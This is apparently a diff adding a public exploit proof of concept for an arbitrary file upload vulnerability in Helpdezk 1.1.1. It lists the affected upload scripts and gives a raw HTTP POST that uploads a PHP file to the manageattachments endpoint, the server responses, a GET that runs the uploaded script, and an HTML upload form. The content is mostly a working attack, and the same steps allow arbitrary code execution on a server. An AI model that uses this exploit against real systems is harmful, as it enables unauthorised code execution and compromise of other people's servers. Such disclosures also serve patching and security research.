@@ -1,0 +1,93 @@
+# Exploit Title: Helpdezk 1.1.1 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-11-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.helpdezk.org/
+# Software Link: https://netcologne.dl.sourceforge.net/project/helpdezk/helpdezk-1.1.1.zip
+# Version: 1.1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/helpdezk/manageattachments/
+# 
+
+# Vulnerability found in more than one file.
+##Log S1##
+//PATH//app//modules//admin//views//upload.php
+//PATH//app//modules//admin//views//upload2.php
+//PATH//app//modules//admin//views//upload3.php
+//PATH//app//modules//admin//views//upload_dsh_image.php
+//PATH//app//modules//admin//views//upload_file.php
+//PATH//app//modules//admin//views//upload_icon.php
+//PATH//app//modules//helpdezk//views//manage_attachments.php
+//PATH//app//modules//helpdezk//views//manage_icons.php
+//PATH//app//modules//helpdezk//views//upload_file_knowledgebase.php
+
+POST /[PATH]/helpdezk/manageattachments/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------1293691802011755498543585049
+Content-Length: 374
+-----------------------------1293691802011755498543585049
+Content-Disposition: form-data; name="file"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------1293691802011755498543585049
+Content-Disposition: form-data; name="Submit"
+Ver Ayari
+-----------------------------1293691802011755498543585049--
+HTTP/1.1 200 OK
+Date: Tue, 13 Nov 2018 19:10:01 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=0qlddpbl1nbpmcaegppm73brg1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2771
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+#
+GET /[PATH]/app/uploads/helpdezk/attachments/4.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=0qlddpbl1nbpmcaegppm73brg1
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 13 Nov 2018 19:10:29 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/helpdezk/manageattachments/
+# 
+# http://localhost/[PATH]/app/uploads/helpdezk/attachments/[NUMBER].php
+# 
+<html>
+<body>
+<form action="http://localhost/[PATH]/helpdezk/manageattachments/" method="post" enctype="multipart/form-data" name="formAt">    
+<input name="file" type="file">    
+<input type="submit" name="Submit" value="Ver Ayari">
+</form>
+</body>
+</html>
